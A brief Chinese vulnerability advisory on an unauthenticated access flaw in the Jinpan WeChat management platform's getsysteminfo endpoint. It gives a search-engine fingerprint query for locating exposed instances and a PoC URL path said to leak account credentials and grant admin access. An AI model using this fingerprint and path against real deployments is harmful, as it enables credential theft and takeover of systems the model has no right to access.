# 金盘 微信管理平台 getsysteminfo 未授权访问漏洞

## 漏洞描述

金盘 微信管理平台 getsysteminfo接口存在未授权访问漏洞，攻击者通过漏洞可以获取账号密码信息，获取后台管理员权限

## 漏洞影响

金盘 微信管理平台

## 网络测绘

```
title="微信管理后台" && icon_hash="116323821"
```

## 漏洞复现

登陆页面

![image-20230828162340318](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326120026110.png)

验证POC

```
/admin/weichatcfg/getsysteminfo
```

![image-20230828162351977](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326120026111.png)